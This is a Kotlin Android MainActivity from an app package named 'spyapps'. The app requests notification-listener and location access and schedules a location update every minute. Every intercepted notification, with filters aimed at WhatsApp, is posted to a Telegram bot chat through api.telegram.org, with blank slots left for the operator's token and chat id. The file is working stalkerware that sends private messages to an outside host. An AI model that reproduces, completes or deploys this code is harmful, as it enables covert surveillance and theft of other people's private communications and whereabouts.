package mobile.android.spyapps

import android.Manifest
import android.app.AlarmManager
import android.app.AlertDialog
import android.app.PendingIntent
import android.content.*
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.StrictMode
import android.os.StrictMode.ThreadPolicy
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.view.View
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.BufferedInputStream
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.URL


class MainActivity : AppCompatActivity() {
    private val ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners"
    private val ACTION_NOTIFICATION_LISTENER_SETTINGS =
        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

    private var txtView: TextView? = null
    private var imageChangeBroadcastReceiver: ReceiveBroadcasterReceiver? = null
    private val interceptedNotificationImageView: ImageView? = null
    private var enableNotificationListenerAlertDialog: AlertDialog? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        txtView = findViewById<View>(R.id.textView) as TextView

        if (!isNotificationServiceEnabled()) {
            enableNotificationListenerAlertDialog = buildNotificationServiceAlertDialog()
            enableNotificationListenerAlertDialog!!.show()
        }

        // Finally we register a receiver to tell the MainActivity when a notification has been received
        imageChangeBroadcastReceiver = ReceiveBroadcasterReceiver()
        val intentFilter = IntentFilter()
        intentFilter.addAction("mobile.android.spyapps")
        registerReceiver(imageChangeBroadcastReceiver, intentFilter)


        val intentLocation = Intent(this@MainActivity, Receiver::class.java)
        val alarmManager = this@MainActivity.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        intentLocation.action = "locationUpdate"
        val pendingIntent = PendingIntent.getBroadcast(this@MainActivity, 0, intentLocation, PendingIntent.FLAG_UPDATE_CURRENT)

        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 1*60*1000, pendingIntent)

        // Request location
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.ACCESS_FINE_LOCATION), 1)

    }

    override fun onDestroy() {
        imageChangeBroadcastReceiver = ReceiveBroadcasterReceiver()
        val intentFilter = IntentFilter()
        intentFilter.addAction("mobile.android.spyapps")
        registerReceiver(imageChangeBroadcastReceiver, intentFilter)
        super.onDestroy()
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val pkgName = packageName
        val flat: String = Settings.Secure.getString(
            contentResolver,
            ENABLED_NOTIFICATION_LISTENERS
        )
        if (!TextUtils.isEmpty(flat)) {
            val names = flat.split(":").toTypedArray()
            for (i in names.indices) {
                val cn = ComponentName.unflattenFromString(names[i])
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.packageName)) {
                        return true
                    }
                }
            }
        }
        return false
    }

    private fun buildNotificationServiceAlertDialog(): AlertDialog? {
        val alertDialogBuilder: AlertDialog.Builder = AlertDialog.Builder(this)
        alertDialogBuilder.setTitle(R.string.notification_listener_service)
        alertDialogBuilder.setMessage(R.string.notification_listener_service_explanation)
        alertDialogBuilder.setPositiveButton(R.string.yes,
            DialogInterface.OnClickListener { dialog, id ->
                startActivity(
                    Intent(
                        ACTION_NOTIFICATION_LISTENER_SETTINGS
                    )
                )
            })
        alertDialogBuilder.setNegativeButton(R.string.no,
            DialogInterface.OnClickListener { dialog, id ->
                // If you choose to not enable the notification listener
                // the app. will not work as expected
            })
        return alertDialogBuilder.create()
    }


    inner class ReceiveBroadcasterReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent) {

            val receivedNotificationCode = intent.getIntExtra("Notification Code", -1)
            val packages = intent.getStringExtra("package")
            val title = intent.getStringExtra("title")
            val text = intent.getStringExtra("text")
            if (text != null) {
                if (!text.contains("new messages") && !text.contains("Whatsapp Web is currently active") && !text.contains(
                        "WhatsApp web login"
                    )
                ) {
                    var message =  "Notification: $receivedNotificationCode\nPackages : \nTitle$title\nText : $text"
                    txtView!!.setText(message)

                    val SDK_INT = Build.VERSION.SDK_INT
                    if (SDK_INT > 8) {
                        val policy = ThreadPolicy.Builder()
                            .permitAll().build()
                        StrictMode.setThreadPolicy(policy)
                        // Add your telegram token here
                        val apiToken = ""
                        val chatId = ""
                        val text = message

                        var urlString = "https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${text}"
                        val url = URL(urlString)
                        val conn = url.openConnection()
                        val inputStream = BufferedInputStream(conn.getInputStream())
                        val br = BufferedReader(InputStreamReader(inputStream))
                        val response = br.readText()
                    }
                }
            }
        }
    }

}